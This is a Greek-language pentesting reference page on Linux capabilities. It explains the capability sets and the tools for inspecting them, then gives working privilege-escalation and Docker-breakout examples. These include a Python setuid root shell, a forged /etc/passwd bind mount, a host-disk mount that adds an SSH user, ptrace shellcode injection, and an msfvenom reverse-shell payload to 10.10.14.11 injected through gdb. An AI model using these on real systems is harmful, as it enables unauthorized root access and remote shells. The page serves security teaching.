# Δυνατότητες Linux

{{#include ../../banners/hacktricks-training.md}}

Οι δυνατότητες Linux διαχωρίζουν τα **δικαιώματα root σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διεργασίες να διαθέτουν υποσύνολο δικαιωμάτων. Αυτό ελαχιστοποιεί τους κινδύνους, επειδή δεν εκχωρούνται πλήρη δικαιώματα root χωρίς να είναι απαραίτητο.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Το πρόβλημα:

- Οι κανονικοί χρήστες έχουν περιορισμένα δικαιώματα για λειτουργίες όπως το άνοιγμα raw sockets ή η σύνδεση σε Internet ports κάτω από το 1024· οι δυνατότητες μπορούν να εκχωρήσουν μόνο την απαιτούμενη λειτουργία αντί για πλήρη δικαιώματα root.<sup>[[14]](#references)</sup>

### Σύνολα δυνατοτήτων:

Το Linux εκθέτει αυτά τα σύνολα δυνατοτήτων ανά thread και ο kernel εφαρμόζει τους περιορισμούς τους όταν μια διεργασία αλλάζει credentials ή εκτελεί ένα αρχείο.<sup>[[14]](#references)</sup>

1. **Κληρονομημένο (CapInh)**:

- **Σκοπός**: Προσδιορίζει τις δυνατότητες που μπορούν να συνεισφέρουν στο permitted set μετά το `execve()`, όταν το εκτελούμενο αρχείο διαθέτει αντίστοιχες inheritable file capabilities.
- **Λειτουργικότητα**: Το inheritable set του thread διατηρείται κατά το `execve()`· από μόνο του δεν καθιστά αυτές τις δυνατότητες effective.
- **Περιορισμοί**: Η προσθήκη μιας δυνατότητας σε αυτό το σύνολο περιορίζεται από τα permitted και bounding sets.<sup>[[14]](#references)</sup>

2. **Ενεργό (CapEff)**:

- **Σκοπός**: Αντιπροσωπεύει τις πραγματικές δυνατότητες που χρησιμοποιεί μια διεργασία κάθε στιγμή.
- **Λειτουργικότητα**: Είναι το σύνολο δυνατοτήτων που ελέγχει ο kernel για να εκχωρήσει δικαιώματα σε διάφορες λειτουργίες. Για τα αρχεία, αυτό το σύνολο μπορεί να είναι μια σημαία που υποδεικνύει αν οι permitted δυνατότητες του αρχείου πρέπει να θεωρούνται effective.
- **Σημασία**: Το effective set είναι κρίσιμο για τους άμεσους ελέγχους δικαιωμάτων και λειτουργεί ως το ενεργό σύνολο δυνατοτήτων που μπορεί να χρησιμοποιήσει μια διεργασία.

3. **Επιτρεπόμενο (CapPrm)**:

- **Σκοπός**: Καθορίζει το μέγιστο σύνολο δυνατοτήτων που μπορεί να διαθέτει μια διεργασία.
- **Λειτουργικότητα**: Μια διεργασία μπορεί να μεταφέρει μια δυνατότητα από το permitted set στο effective set, αποκτώντας τη δυνατότητα να τη χρησιμοποιήσει. Μπορεί επίσης να αφαιρέσει δυνατότητες από το permitted set.
- **Όριο**: Αν μια δυνατότητα αφαιρεθεί από αυτό το σύνολο, κανονικά δεν μπορεί να αποκατασταθεί χωρίς την εκτέλεση ενός αρχείου που την εκχωρεί ή χωρίς άλλη privileged μετάβαση.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Σκοπός**: Περιορίζει τις δυνατότητες που μπορεί να αποκτήσει μια διεργασία από ένα αρχείο κατά το `execve()` και εκείνες που μπορεί να προσθέσει στο inheritable set της.
- **Λειτουργικότητα**: Το σύνολο κληρονομείται κατά το `fork()` και διατηρείται κατά το `execve()`· οι δυνατότητες μπορούν να αφαιρεθούν από αυτό όταν ο caller διαθέτει `CAP_SETPCAP`.
- **Περίπτωση χρήσης**: Η αφαίρεση περιττών δυνατοτήτων από αυτό το σύνολο περιορίζει τη μελλοντική απόκτηση δικαιωμάτων.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Σκοπός**: Επιτρέπει σε επιλεγμένες δυνατότητες να παραμένουν permitted και effective κατά το `execve()` ενός μη privileged προγράμματος.
- **Λειτουργικότητα**: Οι ambient δυνατότητες προστίθενται στα νέα permitted και effective sets όταν το εκτελούμενο αρχείο δεν είναι privileged.
- **Περιορισμοί**: Μια δυνατότητα μπορεί να είναι ambient μόνο όσο υπάρχει τόσο στα permitted όσο και στα inheritable sets· η εκτέλεση ενός αρχείου set-user-ID/set-group-ID ή ενός αρχείου με capabilities εκκαθαρίζει το ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Δυνατότητες διεργασιών και binaries

### Δυνατότητες διεργασιών

Για να δείτε τις δυνατότητες μιας συγκεκριμένης διεργασίας, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Επειδή παρέχει περισσότερες λεπτομέρειες, ας περιοριστούμε μόνο στις πληροφορίες που σχετίζονται με τις δυνατότητες Linux.\
Σημειώστε ότι για όλες τις εκτελούμενες διεργασίες οι πληροφορίες δυνατοτήτων διατηρούνται ανά thread, ενώ οι δυνατότητες αρχείων αποθηκεύονται σε extended attributes `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Μπορείτε να βρείτε τις δυνατότητες που ορίζονται στο /usr/include/linux/capability.h

Μπορείτε να βρείτε τις δυνατότητες της τρέχουσας διεργασίας με `cat /proc/self/status` ή με `capsh --print`, και εκείνες άλλων διεργασιών στο `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Αυτή η εντολή θα πρέπει να επιστρέφει πέντε γραμμές capabilities στα περισσότερα συστήματα.<sup>[[15]](#references)</sup>

- CapInh = Κληρονομημένες capabilities
- CapPrm = Επιτρεπόμενες capabilities
- CapEff = Ενεργές capabilities
- CapBnd = Σύνολο περιορισμού
- CapAmb = Σύνολο ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Αυτοί οι δεκαεξαδικοί αριθμοί δεν βγάζουν νόημα. Χρησιμοποιώντας το εργαλείο `capsh`, μπορούμε να τους αποκωδικοποιήσουμε σε ονόματα capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Ας ελέγξουμε τώρα τα **capabilities** που χρησιμοποιούνται από το `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Παρόλο που αυτό λειτουργεί, υπάρχει ένας ακόμη και ευκολότερος τρόπος. Για να δείτε τα capabilities μιας εκτελούμενης διεργασίας, χρησιμοποιήστε το **getpcaps** tool ακολουθούμενο από το process ID (PID) της· δέχεται επίσης μια λίστα από process IDs.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Ας ελέγξουμε τις capabilities του `tcpdump` αφού δώσουμε στο binary τα `cap_net_admin` και `cap_net_raw` για την παρακολούθηση της κίνησης του δικτύου (`tcpdump` εκτελείται στη διεργασία 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Όπως μπορείτε να δείτε, οι capabilities αντιστοιχούν στα αποτελέσματα των δύο τρόπων επιθεώρησης μιας διεργασίας. Το εργαλείο `getpcaps` χρησιμοποιεί το libcap για να查询σει τις capabilities μιας διεργασίας-στόχου και να τις εμφανίσει σε μορφή κειμένου· δέχεται ένα ή περισσότερα PID.<sup>[[22]](#references)</sup>

### Capabilities δυαδικών αρχείων

Τα δυαδικά αρχεία μπορούν να διαθέτουν file capabilities που εφαρμόζονται κατά την εκτέλεση. Για παράδειγμα, ένα δυαδικό αρχείο `ping` μπορεί να διαθέτει την capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Μπορείτε να **αναζητήσετε binaries με capabilities** χρησιμοποιώντας το `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Αφαίρεση capabilities με το capsh

Αν αφαιρέσουμε το `CAP_NET_RAW` από το ενεργό bounding set, ένα πρόγραμμα που χρειάζεται αυτήν την capability δεν θα πρέπει πλέον να μπορεί να τη χρησιμοποιήσει.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Εκτός από την έξοδο του ίδιου του _capsh_, και η ίδια η εντολή _tcpdump_ θα πρέπει επίσης να εμφανίσει σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Το σφάλμα δείχνει ότι το `tcpdump` δεν μπορεί να εκτελεστεί με την ζητούμενη δυνατότητα αρχείου, αφού το `CAP_NET_RAW` αφαιρέθηκε από το bounding set.

### Αφαίρεση δυνατοτήτων

Μπορείτε να αφαιρέσετε τις δυνατότητες ενός αρχείου με το `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Capabilities χρηστών

Το Linux δεν εκχωρεί file capabilities απευθείας σε έναν χρήστη σύνδεσης, αλλά το PAM module `pam_cap` μπορεί να ορίσει inheritable capabilities για authenticated sessions χρησιμοποιώντας το `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Κάθε καταχώριση αντιστοιχίζει ονόματα ή αριθμούς capabilities, διαχωρισμένα με κόμματα, σε ένα ή περισσότερα usernames.<sup>[[17]](#references)</sup>  
Παράδειγμα αρχείου:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities περιβάλλοντος

Η μεταγλώττιση του παρακάτω προγράμματος καθιστά δυνατή την **εκκίνηση ενός bash shell μέσα σε ένα περιβάλλον που παρέχει capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Μέσα στο **bash που εκτελείται από το compiled ambient binary**, είναι δυνατό να παρατηρηθούν οι **νέες capabilities** (ένας κανονικός χρήστης δεν θα έχει καμία capability στην ενότητα "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Μπορείτε να **προσθέσετε μόνο capabilities που υπάρχουν** τόσο στα permitted όσο και στα inheritable sets.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

Ένα capability-dumb binary είναι ένα πρόγραμμα με file capabilities που δεν χρησιμοποιεί το libcap για τη διαχείρισή τους. Αν έχει οριστεί το file effective bit, ο kernel ενεργοποιεί τα permitted capabilities του αρχείου στο effective set της διεργασίας· η εκτέλεση μπορεί να αποτύχει αν η διεργασία δεν απέκτησε όλα τα permitted capabilities.<sup>[[14]](#references)</sup>

## Capabilities υπηρεσιών

Μια system service που εκτελείται ως root μπορεί να διατηρεί ευρεία capabilities, εκτός αν το περιβάλλον εκτέλεσής της τις περιορίζει. Σε μια μονάδα systemd, το `User=` επιλέγει τον χρήστη της υπηρεσίας και το `AmbientCapabilities=` προσθέτει τις ονομασμένες capabilities στο ambient set της διεργασίας που εκτελείται.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities σε Docker Containers

Το Docker εκκινεί containers με ένα προεπιλεγμένο σύνολο capabilities, το οποίο μπορεί να τροποποιηθεί με τις επιλογές `--cap-add` και `--cap-drop`. Ένα container μπορεί να ελεγχθεί με το `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Οι Capabilities είναι χρήσιμες όταν **θέλετε να περιορίσετε τις δικές σας διεργασίες μετά την εκτέλεση προνομιούχων ενεργειών** (π.χ. μετά τη ρύθμιση του chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να γίνουν αντικείμενο εκμετάλλευσης με την παράδοση malicious εντολών ή ορισμάτων, τα οποία στη συνέχεια εκτελούνται ως root.<sup>[[2]](#references)</sup>

Μπορείτε να επιβάλετε file capabilities σε προγράμματα με το `setcap` και να τις αναζητήσετε με το `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Για κείμενο file-capability, το `+ep` αυξάνει το καθορισμένο capability στα effective και permitted sets, ενώ το `-` μειώνει τις επιλεγμένες flags.<sup>[[21]](#references)</sup>

Για να εντοπίσετε προγράμματα σε ένα σύστημα ή φάκελο που διαθέτουν capabilities, χρησιμοποιήστε το `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Παράδειγμα εκμετάλλευσης

Στο ακόλουθο παράδειγμα το binary `/usr/bin/python2.6` εντοπίζεται ως ευάλωτο σε privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** που χρειάζεται το `tcpdump` για να **επιτρέπεται σε οποιονδήποτε χρήστη να κάνει sniff σε packets**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Η ειδική περίπτωση των "empty" capabilities

Ένα αρχείο μπορεί να περιέχει ένα κενό σύνολο capabilities (`getcap myelf` επιστρέφει `myelf =ep`). Ένα κενό σύνολο δεν παρέχει capabilities· όταν συνδυάζεται με ένα root-owned set-user-ID bit, το πρόγραμμα μπορεί και πάλι να αλλάξει τα effective και saved IDs της εκτελούμενης διεργασίας σε 0, χωρίς να αποκτήσει file capabilities. Ένα unowned, non-SUID/SGID αρχείο με `=ep` δεν εκτελείται ως root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

Το **[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι ένα ιδιαίτερα ισχυρό Linux capability, το οποίο συχνά εξισώνεται με επίπεδο σχεδόν root λόγω των εκτεταμένων **administrative privileges** του, όπως η προσάρτηση συσκευών ή ο χειρισμός kernel features. Παρότι είναι απαραίτητο για containers που προσομοιώνουν ολόκληρα συστήματα, το **`CAP_SYS_ADMIN` δημιουργεί σημαντικές προκλήσεις ασφάλειας**, ειδικά σε containerized environments, λόγω της πιθανότητάς του να οδηγήσει σε privilege escalation και compromise του συστήματος. Επομένως, η χρήση του απαιτεί αυστηρές αξιολογήσεις ασφάλειας και προσεκτική διαχείριση, με ισχυρή προτίμηση στην αφαίρεση αυτού του capability από application-specific containers, ώστε να τηρείται η **principle of least privilege** και να ελαχιστοποιείται το attack surface.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Χρησιμοποιώντας την Python, μπορείτε να προσαρτήσετε ένα τροποποιημένο αρχείο _passwd_ πάνω από το πραγματικό αρχείο _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Και τέλος κάντε **mount** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Και θα μπορείτε να εκτελέσετε **`su` ως root** χρησιμοποιώντας τον κωδικό πρόσβασης "password".

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο Docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η capability SYS_ADMIN είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

- **Mount**

Με κατάλληλη πρόσβαση στη συσκευή και στο namespace, αυτό μπορεί να επιτρέψει σε ένα Docker container να **κάνει mount έναν δίσκο του host και να αποκτήσει πρόσβαση στα περιεχόμενά του**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση σε έναν δίσκο host.\
Εάν ο host εκτελεί έναν **ssh** server, θα μπορούσατε να **δημιουργήσετε έναν χρήστη μέσα στον προσαρτημένο δίσκο** και να αποκτήσετε πρόσβαση σε αυτόν μέσω SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Με το `CAP_SYS_PTRACE`, μια διεργασία μπορεί να παρακολουθεί και να επιθεωρεί άλλες διεργασίες που είναι ορατές στο PID namespace της. Για τη στόχευση διεργασιών του host από ένα Docker container, μοιραστείτε το PID namespace του host με `--pid=host` (ή συνδεθείτε σε ένα namespace που περιέχει τον στόχο).<sup>[[14]](#references)[[20]](#references)</sup>

Το **[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης λειτουργιών debugging και system call tracing που παρέχονται από το `ptrace(2)` και από cross-memory attach calls, όπως τα `process_vm_readv(2)` και `process_vm_writev(2)`. Παρότι είναι ισχυρό για σκοπούς διάγνωσης και monitoring, αν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα, όπως ένα seccomp filter στο `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να αξιοποιηθεί για την παράκαμψη άλλων περιορισμών ασφαλείας, ιδίως εκείνων που επιβάλλονται από το seccomp, όπως αποδεικνύεται από [proofs of concept (PoC) όπως αυτό](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Παράδειγμα με binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Παράδειγμα με binary (gdb)**

Το `gdb` με capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Δημιουργία shellcode με το msfvenom για injection στη μνήμη μέσω gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Κάντε debug σε μια root διεργασία με το gdb και κάντε copy-paste τις γραμμές gdb που δημιουργήθηκαν προηγουμένως:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Παράδειγμα με environment (Docker breakout) - Another gdb Abuse**

